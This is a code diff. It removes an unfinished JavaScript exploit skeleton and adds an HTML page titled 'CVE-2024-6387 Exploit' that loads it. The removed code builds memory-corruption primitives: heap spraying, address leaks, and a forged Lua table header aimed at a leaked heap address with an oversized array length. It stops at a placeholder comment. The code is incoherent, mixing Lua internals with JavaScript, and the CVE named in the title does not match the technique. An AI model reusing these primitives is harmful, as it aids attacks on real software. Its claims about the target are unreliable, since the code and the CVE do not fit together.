@@ -1,118 +1,15 @@
-const n_expand = 5462;
-const n_spray = 0x10000;
-const string_overhead = 24 + 1 + 8; // sizeof(TString): 24, NULL terminator: 1, malloc chunk overhead: 8
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="en">
 
-const LUA_TNIL = 0;
-const LUA_TBOOLEAN = 1;
-const LUA_TLIGHTUSERDATA = 2;
-const LUA_TNUMBER = 3;
-const LUA_TSTRING = 4;
-const LUA_TTABLE = 5;
-const LUA_TFUNCTION = 6;
-const LUA_TUSERDATA = 7;
-const LUA_TTHREAD = 8;
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2024-6387 Exploit</title>
+</head>
 
-function p64(val) {
-    let s = "";
-    for (let i = 0; i < 8; i++) {
-        s += String.fromCharCode(val % 0x100);
-        val = Math.floor(val / 0x100);
-    }
-    return s;
-}
+<body>
+    <script src="exploit.js"></script>
+</body>
 
-function addrof(obj) {
-    let s = obj.toString();
-    if (s.startsWith("t")) {
-        return parseInt(s.substring(8), 16);
-    } else {
-        return parseInt(s.substring(11), 16);
-    }
-}
-
-function bytesToDouble(data) {
-    return new Float64Array(new Uint8Array(data).buffer)[0];
-}
-
-function doubleToInt(data) {
-    return new Float64Array(new BigInt64Array([data]).buffer)[0];
-}
-
-function intToDouble(data) {
-    return new Float64Array(new BigInt64Array([BigInt(data)]).buffer)[0];
-}
-
-function exploit() {
-    let refs = [];
-    let refs_i = 0;
-    for (let i = 0; i < 100000; i++) {
-        refs.push(0);
-    }
-
-    let b = "";
-    let numberStrings = [];
-    for (let i = 1; i <= 0x40000; i++) {
-        numberStrings.push(i.toString(16).padStart(8, '0'));
-    }
-    for (let str of numberStrings) {
-        b += str;
-    }
-    for (let i = 0; i < 15; i++) {
-        b += b;
-    }
-
-    let stringSource = b;
-
-    let heapAddrLeaker = [];
-    let fakeArrayBase = addrof(heapAddrLeaker);
-
-    let owowArray1 = null;
-    let owowArray1Addr = null;
-    for (let i = 0; i < 100; i++) {
-        let arr = [];
-        let addr = addrof(arr);
-
-        refs[refs_i] = arr;
-        refs_i++;
-
-        if (addr > fakeArrayBase) {
-            owowArray1 = arr;
-            owowArray1Addr = addr;
-            break;
-        }
-    }
-    if (owowArray1 === null) {
-        throw new Error("failed to allocate owowArray1 behind fakeArrayBase");
-    }
-    for (let i = 0; i < 10000; i++) {
-        owowArray1.push(0);
-    }
-
-    let fakeTableTemplate = "SSSSSSSSFF" +
-        "\x00\x00\x00\x00\x00\x00\x00\x00" + // *next
-        "\x05" + // tt (LUA_TTABLE)
-        "\x01" + // marked
-        "\x00" + // flags
-        "\x00\x00\x00\x00\x00" +
-        "\x00\x00\x00\x00\x00\x00\x00\x00" + // _padding_
-        "\x00\x00\x00\x00\x00\x00\x00\x00" + // *metatable
-        p64(fakeArrayBase) + // *array --> low heap address
-        "\x00\x00\x00\x00\x00\x00\x00\x00" + // *node
-        "\x00\x00\x00\x00\x00\x00\x00\x00" + // *lastfree
-        "\x00\x00\x00\x00\x00\x00\x00\x00" + // *gclist
-        "\xff\xff\xff\x7f\x00\x00\x00\x00"; // sizearray
-    if (fakeTableTemplate.length !== 82) {
-        throw new Error("DO NOT CHANGE LENGTH");
-    }
-
-    let leakerArray = [0, 0];
-
-    let heapExpand = [];
-    for (let i = 0; i < n_expand; i++) {
-        heapExpand.push(0);
-    }
-
-    // Further code for exploit can be added here
-}
-
-exploit();
+</html>
